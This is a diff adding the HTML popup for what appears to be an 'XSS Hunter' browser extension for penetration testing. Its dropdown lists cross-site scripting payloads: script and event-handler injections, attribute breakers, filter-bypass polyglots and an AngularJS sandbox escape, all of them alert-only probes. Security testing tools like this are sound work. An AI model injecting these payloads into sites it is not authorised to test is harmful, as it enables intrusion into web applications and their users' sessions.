@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <style>
+    /* Reset & Base */
+    * { box-sizing: border-box; }
+    body {
+      width: 380px; /* Slightly wider for longer payloads */
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background-color: #0f172a; 
+      color: #e2e8f0;
+    }
+
+    /* Header */
+    .header {
+      background-color: #1e293b;
+      padding: 15px 20px;
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #334155;
+    }
+    .header img {
+      width: 24px;
+      height: 24px;
+      border-radius: 4px;
+      margin-right: 12px;
+    }
+    .header h2 {
+      margin: 0;
+      font-size: 16px;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      color: #f8fafc;
+    }
+    .badge {
+      margin-left: auto;
+      background-color: #dc2626;
+      color: white;
+      font-size: 10px;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-weight: bold;
+      text-transform: uppercase;
+    }
+
+    /* Content Area */
+    .container { padding: 20px; }
+    .group { margin-bottom: 15px; }
+    
+    label {
+      display: block;
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: #94a3b8;
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+    
+    /* Inputs */
+    select, input[type="text"] {
+      width: 100%;
+      background-color: #1e293b;
+      border: 1px solid #334155;
+      color: #f1f5f9;
+      padding: 10px;
+      border-radius: 6px;
+      font-family: 'Consolas', 'Monaco', monospace; 
+      font-size: 11px; /* Smaller font for long payloads */
+      transition: border-color 0.2s;
+    }
+    select:focus, input:focus {
+      outline: none;
+      border-color: #ef4444; 
+    }
+    
+    /* Optgroup styling support */
+    optgroup { color: #cbd5e1; background: #334155; }
+    option { background: #1e293b; color: #f1f5f9; }
+
+    /* Action Button */
+    button {
+      width: 100%;
+      background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      transition: transform 0.1s, opacity 0.2s;
+      box-shadow: 0 4px 6px -1px rgba(220, 38, 38, 0.2);
+    }
+    button:hover { opacity: 0.9; }
+    button:active { transform: scale(0.98); }
+
+    /* Status Area */
+    #status {
+      margin-top: 20px;
+      padding: 12px;
+      border-radius: 6px;
+      font-size: 12px;
+      line-height: 1.4;
+      display: none;
+    }
+    .info {
+      background-color: #1e293b;
+      color: #94a3b8;
+      border: 1px solid #334155;
+      border-left: 3px solid #3b82f6;
+    }
+    .success {
+      background-color: #450a0a; 
+      color: #fca5a5;
+      border: 1px solid #7f1d1d;
+      border-left: 3px solid #ef4444;
+      font-weight: bold;
+    }
+
+    .footer { margin-top: 15px; text-align: center; font-size: 10px; color: #475569; }
+  </style>
+</head>
+<body>
+  
+  <div class="header">
+    <img src="icon.jpg" alt="Icon">
+    <h2>XSS Hunter</h2>
+    <span class="badge">v3.0</span>
+  </div>
+
+  <div class="container">
+    <div class="group">
+      <label for="payloadSelect">Attack Vector</label>
+      <select id="payloadSelect">
+        <optgroup label="Standard Injection">
+            <option value="<script>alert('XSS')</script>">Basic Script Tag</option>
+            <option value="<img src=x onerror=alert('XSS')>">Image OnError</option>
+            <option value="<svg/onload=alert('XSS')>">SVG OnLoad</option>
+            <option value="javascript:alert('XSS')">Javascript Protocol</option>
+        </optgroup>
+        
+        <optgroup label="Context Breakers (Attribute)">
+            <option value='"><script>alert("XSS")</script>'>Quote Break (")</option>
+            <option value="'><script>alert('XSS')</script>">Quote Break (')</option>
+            <option value='" onmouseover=alert(1) //'>Attribute Break (Mouseover)</option>
+            <option value='" autofocus onfocus=alert(1) //'>Attribute Break (Autofocus)</option>
+        </optgroup>
+
+        <optgroup label="Polyglots (Advanced)">
+            <option value="javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>">Ultimate Polyglot</option>
+            <option value="jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e">Filter Bypass Polyglot</option>
+        </optgroup>
+
+        <optgroup label="Framework Injection (Angular/Vue)">
+            <option value="{{7*7}}">Template Test {{7*7}}</option>
+            <option value="{{constructor.constructor('alert(1)')()}}">AngularJS Sandbox Escape</option>
+        </optgroup>
+
+        <option value="custom">Custom Payload...</option>
+      </select>
+    </div>
+
+    <div class="group">
+      <label for="customPayload">Payload Config</label>
+      <input type="text" id="customPayload" value="<script>alert('XSS')</script>">
+    </div>
+    
+    <button id="scanBtn">INJECT & SCAN</button>
+    
+    <div id="status"></div>
+
+    <div class="footer">
+      Use responsibly on owned assets only.
+    </div>
+  </div>
+
+  <script src="popup.js"></script>
+</body>
+</html>
